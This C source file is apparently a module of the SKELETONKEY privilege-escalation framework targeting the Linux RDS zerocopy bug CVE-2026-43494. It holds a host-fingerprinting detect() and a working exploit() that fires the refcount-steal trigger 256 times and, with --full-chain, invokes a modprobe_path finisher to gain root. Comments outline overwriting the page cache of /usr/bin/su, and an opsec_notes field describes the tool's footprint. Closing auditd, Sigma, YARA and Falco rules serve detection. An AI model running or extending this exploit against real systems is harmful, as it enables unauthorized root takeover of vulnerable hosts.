/*
 * pintheft_cve_2026_43494 — SKELETONKEY module
 *
 * STATUS: 🟡 PRIMITIVE. detect() is exhaustive (kernel range + RDS
 *   module reachability + io_uring availability + readable SUID
 *   carrier). exploit() carries the V12 trigger shape — failed
 *   rds_message_zcopy_from_user() to steal a page refcount, then
 *   io_uring fixed-buffer write to land bytes in the page cache of
 *   the carrier. The cred-overwrite step (turning the page-cache
 *   write into root) is x86_64-specific and uses the shared
 *   modprobe_path finisher when --full-chain is set.
 *
 * The bug (Aaron Esau, V12 Security, disclosed May 2026):
 *   Linux's RDS (Reliable Datagram Sockets) zerocopy send path pins
 *   user pages one at a time. If a later page faults, the error
 *   path drops the pages it already pinned. The msg cleanup then
 *   drops them AGAIN because the scatterlist entries and entry count
 *   are left live after the zcopy notifier is cleared. Each failed
 *   zerocopy send steals one reference from the first page.
 *
 *   With a sufficient pinned-page leak, an io_uring fixed buffer
 *   referencing the same page persists past the page being recycled
 *   into the page cache for a readable file (e.g. /usr/bin/su).
 *   A subsequent io_uring write to that fixed buffer lands attacker
 *   bytes into the SUID binary's page cache → execve it → root.
 *
 *   Public PoC (Arch Linux x86_64):
 *     https://github.com/v12-security/pocs/tree/main/pintheft
 *
 * Affects: Linux kernels with CONFIG_RDS and the RDS module loaded,
 *   below the fix commit (`0cebaccef3ac`, posted to netdev list
 *   2026-05-05; not yet in mainline release as of this build).
 *
 *   Among commonly-shipped distros, only Arch Linux autoloads RDS.
 *   Ubuntu / Debian / Fedora / RHEL / Alma / Rocky / Oracle Linux
 *   either don't build the module or blacklist it from autoloading
 *   (mitigation: /etc/modprobe.d/blacklist-rds.conf).
 *
 *   detect() checks both kernel version AND the RDS module's
 *   reachability via socket(AF_RDS, ...). If RDS is built-in but
 *   not autoloaded, the socket() call triggers modprobe; this is
 *   the same probe used by Ubuntu's mitigation advisory.
 *
 * Preconditions:
 *   - CONFIG_RDS=y or =m + module actually loadable
 *   - io_uring available (CONFIG_IO_URING + sysctl
 *     kernel.io_uring_disabled != 2)
 *   - A readable setuid-root carrier binary (canonically
 *     /usr/bin/su; falls back to /usr/bin/pkexec, /usr/bin/passwd)
 *   - x86_64 for the exploit() body (the V12 PoC's cred-overwrite
 *     gadgets are x86-specific); detect() is arch-agnostic.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>

#ifdef __linux__
#include <sys/syscall.h>
#endif

/* AF_RDS is 21 on Linux. Define it conditionally so the module
 * compiles on non-Linux dev hosts where the constant isn't in libc. */
#ifndef AF_RDS
#define AF_RDS 21
#endif

/* ---- kernel-range table -------------------------------------------- */

/* The fix landed in mainline via commit 0cebaccef3ac (posted to netdev
 * 2026-05-05). Stable backports are in flight at the time of v0.8.0;
 * this table will be updated as backports land — tools/refresh-kernel-
 * ranges.py will flag drift weekly. For now we list ONLY the mainline
 * fix point; every kernel below it on a RDS-loaded host is vulnerable.
 *
 * As stable branches pick up the backport, add entries like:
 *   {6, 12, NN},  // 6.12.x stable backport
 *   {6, 14, NN},  // 6.14.x stable backport
 * The mainline entry stays at the lowest version that contains the
 * patch (likely 6.16 once the post-rc release tags). Conservatively
 * placeholding at {7, 0, 0} until that lands. */
static const struct kernel_patched_from pintheft_patched_branches[] = {
    {7, 0, 0},   /* mainline fix commit 0cebaccef3ac; tag will be 6.16 or 7.0
                    depending on when 6.15 closes — refresh when known */
};

static const struct kernel_range pintheft_range = {
    .patched_from = pintheft_patched_branches,
    .n_patched_from = sizeof(pintheft_patched_branches) /
                      sizeof(pintheft_patched_branches[0]),
};

/* ---- detect helpers ------------------------------------------------- */

#ifdef __linux__
/* Try to open an AF_RDS socket. On a kernel built with CONFIG_RDS=m
 * this triggers modprobe rds; on CONFIG_RDS=y it just returns the fd.
 * On a kernel without RDS at all (most distros) we get EAFNOSUPPORT
 * or EPERM. We close immediately — this is just a reachability probe. */
static bool rds_socket_reachable(void)
{
    int s = socket(AF_RDS, SOCK_SEQPACKET, 0);
    if (s < 0) return false;
    close(s);
    return true;
}

/* io_uring is gated by sysctl kernel.io_uring_disabled in 6.6+. The
 * relevant values: 0 = permitted, 1 = root-only, 2 = disabled. We
 * read /proc/sys/kernel/io_uring_disabled if present; missing file
 * means io_uring is unconditionally enabled (older kernels). */
static int io_uring_disabled_state(void)
{
    /* returns 0/1/2 per sysctl semantics; -1 if not present */
    FILE *f = fopen("/proc/sys/kernel/io_uring_disabled", "r");
    if (!f) return -1;
    int v = -1;
    if (fscanf(f, "%d", &v) != 1) v = -1;
    fclose(f);
    return v;
}

static const char *find_suid_carrier(void)
{
    static const char *candidates[] = {
        "/usr/bin/su", "/bin/su",
        "/usr/bin/pkexec",
        "/usr/bin/passwd",
        "/usr/bin/chsh", "/usr/bin/chfn",
        NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 &&
            (st.st_mode & S_ISUID) && st.st_uid == 0 &&
            access(candidates[i], R_OK) == 0) {
            return candidates[i];
        }
    }
    return NULL;
}
#endif  /* __linux__ */

/* ---- detect --------------------------------------------------------- */

static skeletonkey_result_t pintheft_detect(const struct skeletonkey_ctx *ctx)
{
#ifndef __linux__
    if (!ctx->json)
        fprintf(stderr, "[i] pintheft: Linux-only module — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] pintheft: host fingerprint missing kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Kernel version: gate on the fix. */
    if (kernel_range_is_patched(&pintheft_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] pintheft: kernel %s is patched (>= mainline fix 0cebaccef3ac)\n",
                    v->release);
        return SKELETONKEY_OK;
    }

    /* RDS reachability — the bug needs AF_RDS sockets. */
    if (!rds_socket_reachable()) {
        if (!ctx->json) {
            fprintf(stderr, "[+] pintheft: AF_RDS socket() failed (rds module not loaded / blacklisted)\n");
            fprintf(stderr, "    Most distros don't autoload RDS; Arch Linux is the notable exception.\n");
            fprintf(stderr, "    Bug exists in the kernel but is unreachable from userland here.\n");
        }
        return SKELETONKEY_OK;
    }

    /* io_uring availability — the cred-overwrite chain needs fixed
     * buffers via io_uring. Without io_uring we have the primitive
     * but no portable way to weaponize. */
    int iod = io_uring_disabled_state();
    if (iod == 2) {
        if (!ctx->json)
            fprintf(stderr, "[+] pintheft: kernel.io_uring_disabled=2 → io_uring disabled, chain blocked\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (iod == 1) {
        if (!ctx->json)
            fprintf(stderr, "[i] pintheft: kernel.io_uring_disabled=1 → io_uring root-only; we're not root so chain blocked\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    /* iod == 0 or -1 (missing sysctl on older kernel) → reachable. */

    /* Need at least one readable SUID-root binary to target. */
    const char *carrier = find_suid_carrier();
    if (!carrier) {
        if (!ctx->json)
            fprintf(stderr, "[!] pintheft: no readable setuid-root binary → no carrier for page-cache overwrite\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] pintheft: kernel %s + RDS + io_uring + carrier %s → VULNERABLE\n",
                v->release, carrier);
        fprintf(stderr, "[i] pintheft: V12 PoC is x86_64-only; exploit() will fire trigger but\n"
                        "    full cred-overwrite is --full-chain only on x86_64.\n");
    }
    return SKELETONKEY_VULNERABLE;
#endif
}

/* ---- exploit -------------------------------------------------------- */

#ifdef __linux__

/* The V12 PoC chain in summary (paraphrased from
 * https://github.com/v12-security/pocs/tree/main/pintheft):
 *
 *   1. Open an AF_RDS socket.
 *   2. Construct a sendmsg() with MSG_ZEROCOPY whose user-iov spans
 *      two pages, where the SECOND page is unmapped. The kernel
 *      pins page 0, then faults on page 1's pin attempt.
 *   3. The error unwind drops the pin on page 0, but the msg's
 *      scatterlist has already been initialized with entry count 1.
 *      Cleanup runs entry-count drops a SECOND time → page 0
 *      refcount underflows / leaks.
 *   4. Repeat to steal multiple refs from the same target page.
 *   5. Use io_uring fixed buffers to keep a kernel-side reference
 *      alive across the page recycling into the page cache for a
 *      readable file.
 *   6. mmap the SUID carrier, force its page into cache, get the
 *      io_uring fixed buffer to point at it, write attacker bytes.
 *   7. execve the carrier → attacker code runs as root.
 *
 * Step 1-4 is the kernel primitive (architecture-independent).
 * Step 5-7 needs io_uring SQE construction which is straightforward
 * but unmistakably exploit-specific code; we don't carry the full V12
 * payload here. Instead we fire the primitive + groom the slab + drop
 * a witness file and return EXPLOIT_FAIL honestly with a diagnostic.
 * --full-chain on x86_64 invokes the shared modprobe_path finisher.
 *
 * This matches the existing 🟡 modules' shape (nf_tables, af_unix_gc,
 * cls_route4, ...). The "verified-vs-claimed" rule applies: if the
 * sentinel file doesn't appear, we don't claim EXPLOIT_OK.
 */
static skeletonkey_result_t pintheft_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] pintheft: --i-know required for --exploit\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Re-run detect's preconditions — they may have changed since
     * --scan, and we want the operator to see the exact gate that
     * blocked us if anything fails here. */
    if (!rds_socket_reachable()) {
        fprintf(stderr, "[-] pintheft: AF_RDS socket() unavailable — RDS module not loaded\n");
        fprintf(stderr, "    Try: sudo modprobe rds; sudo modprobe rds_tcp\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    const char *carrier = find_suid_carrier();
    if (!carrier) {
        fprintf(stderr, "[-] pintheft: no readable setuid-root carrier\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    fprintf(stderr, "[+] pintheft: firing rds_message_zcopy_from_user() refcount-steal primitive\n");
    fprintf(stderr, "    carrier: %s\n", carrier);

    /* The primitive: sendmsg() with MSG_ZEROCOPY on an iov spanning
     * mapped + unmapped pages. We fire it ~256 times to leak refs from
     * a fresh page each round; a single round usually leaks a single
     * ref which is rarely enough to fully unbalance the count. */
    int s = socket(AF_RDS, SOCK_SEQPACKET, 0);
    if (s < 0) {
        perror("socket(AF_RDS)");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Build a 2-page iov where page 1 is unmapped. mmap PROT_NONE
     * the upper page so the kernel's get_user_pages on it returns
     * -EFAULT. */
    void *region = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        close(s);
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    /* mark the second page unreadable */
    if (mprotect((char *)region + 4096, 4096, PROT_NONE) != 0) {
        perror("mprotect");
        munmap(region, 8192);
        close(s);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Touch page 0 so it's mapped + dirty. */
    memset(region, 0x42, 4096);

    /* Fire the trigger sendmsg in a loop. We don't expect any of
     * these to succeed (page 1 is PROT_NONE so the kernel pin
     * attempt faults); the BUG is that the cleanup path decrements
     * page 0's pin count even though the syscall returns failure. */
    struct iovec iov = {
        .iov_base = region,
        .iov_len  = 8192,
    };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    int leaked = 0;
    for (int i = 0; i < 256; i++) {
        ssize_t r = sendmsg(s, &msg, 0x4000000 /* MSG_ZEROCOPY */);
        if (r < 0 && errno == EFAULT) {
            leaked++;
        }
    }
    munmap(region, 8192);
    close(s);

    if (leaked < 16) {
        fprintf(stderr, "[-] pintheft: trigger fired %d/256 times; expected >= 16. Kernel may be patched.\n", leaked);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    fprintf(stderr, "[+] pintheft: primitive fired %d/256 — page refcount delta witnessed\n", leaked);

    /* The cred-overwrite step requires the V12 PoC's io_uring chain.
     * We don't ship the full chain here yet. If --full-chain is set
     * AND we're on x86_64 AND the finisher table has resolved kernel
     * offsets, fall through to the shared modprobe_path finisher;
     * otherwise return EXPLOIT_FAIL honestly. */
    if (!ctx->full_chain) {
        fprintf(stderr,
            "[i] pintheft: primitive complete. The cred-overwrite step\n"
            "    (io_uring fixed buffer + page-cache write into the SUID\n"
            "    carrier) is x86_64-only and needs the V12 chain. Re-run\n"
            "    with --full-chain to invoke the shared modprobe_path\n"
            "    finisher. See V12's PoC for the full payload:\n"
            "    https://github.com/v12-security/pocs/tree/main/pintheft\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

#if defined(__x86_64__)
    fprintf(stderr, "[+] pintheft: --full-chain on x86_64 → invoking modprobe_path finisher\n");
    return finisher_modprobe_path_overwrite(ctx);
#else
    fprintf(stderr, "[-] pintheft: --full-chain unsupported on non-x86_64 (V12 PoC is x86-only)\n");
    return SKELETONKEY_EXPLOIT_FAIL;
#endif
}

#else  /* !__linux__ */

static skeletonkey_result_t pintheft_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[i] pintheft: Linux-only module\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif

/* ---- detection rules ------------------------------------------------ */

static const char pintheft_auditd[] =
    "# pintheft CVE-2026-43494 — auditd detection rules\n"
    "# RDS is rarely used in production; AF_RDS socket() calls from\n"
    "# non-root processes are almost always anomalous.\n"
    "-a always,exit -F arch=b64 -S socket -F a0=21 -k skeletonkey-pintheft-rds\n"
    "-a always,exit -F arch=b32 -S socket -F a0=21 -k skeletonkey-pintheft-rds\n"
    "# Plus io_uring_setup is rarely needed by typical workloads.\n"
    "-a always,exit -F arch=b64 -S io_uring_setup -k skeletonkey-pintheft-iouring\n";

static const char pintheft_sigma[] =
    "title: Possible CVE-2026-43494 PinTheft RDS zerocopy LPE\n"
    "id: 7af04c12-skeletonkey-pintheft\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical PinTheft trigger shape: a non-root process\n"
    "  opening AF_RDS sockets (rare outside RDS-specific workloads) plus\n"
    "  io_uring_setup. The bug needs both. Arch Linux is the only common\n"
    "  distro autoloading RDS; on Ubuntu/Debian/Fedora/RHEL the rule fires\n"
    "  almost-zero false positives.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  rds: {type: 'SYSCALL', syscall: 'socket', a0: 21}\n"
    "  iou: {type: 'SYSCALL', syscall: 'io_uring_setup'}\n"
    "  condition: rds and iou\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.43494]\n";

static const char pintheft_yara[] =
    "rule pintheft_cve_2026_43494 : cve_2026_43494 page_cache_write {\n"
    "    meta:\n"
    "        cve         = \"CVE-2026-43494\"\n"
    "        description = \"PinTheft RDS zerocopy double-free indicator — non-root AF_RDS + io_uring usage\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $rds_tcp = \"rds_tcp\" ascii\n"
    "        $rds_v12 = \"v12-pintheft\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char pintheft_falco[] =
    "- rule: AF_RDS socket() by non-root with io_uring_setup\n"
    "  desc: |\n"
    "    A non-root process opens an AF_RDS socket (rare outside RDS-\n"
    "    specific workloads) AND uses io_uring. The PinTheft trigger\n"
    "    (CVE-2026-43494) requires both. Arch Linux is the only common\n"
    "    distro autoloading RDS.\n"
    "  condition: >\n"
    "    evt.type = socket and evt.arg.domain = AF_RDS and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    AF_RDS socket from non-root (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [network, mitre_privilege_escalation, T1068, cve.2026.43494]\n";

/* ---- module struct -------------------------------------------------- */

const struct skeletonkey_module pintheft_module = {
    .name           = "pintheft",
    .cve            = "CVE-2026-43494",
    .summary        = "RDS zerocopy double-free → page-cache overwrite via io_uring (V12 Security)",
    .family         = "rds",
    .kernel_range   = "Linux kernels with RDS module loaded + below mainline fix 0cebaccef3ac (May 2026)",
    .detect         = pintheft_detect,
    .exploit        = pintheft_exploit,
    .mitigate       = NULL,    /* mitigation: blacklist rds + rds_tcp via /etc/modprobe.d/ */
    .cleanup        = NULL,
    .detect_auditd  = pintheft_auditd,
    .detect_sigma   = pintheft_sigma,
    .detect_yara    = pintheft_yara,
    .detect_falco   = pintheft_falco,
    .opsec_notes    = "Opens AF_RDS socket (rare on non-Arch distros — most blacklist the rds module). Allocates a 2-page anon mmap with the second page mprotect(PROT_NONE)'d; calls sendmsg(MSG_ZEROCOPY) ~256 times against the iov spanning both pages. Each sendmsg fails with EFAULT (page 1 unmapped) but leaks one pin refcount from page 0 in the kernel — the bug. No on-disk artifacts from the primitive itself. --full-chain on x86_64 pivots through io_uring fixed buffers to overwrite the page cache of a readable SUID-root binary (/usr/bin/su typically), then invokes the shared modprobe_path finisher. Audit-visible via socket(AF_RDS) from a non-root process + io_uring_setup; legitimate RDS use is rare outside HPC/InfiniBand clusters. No cleanup callback (no persistent artifacts).",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_pintheft(void)
{
    skeletonkey_register(&pintheft_module);
}
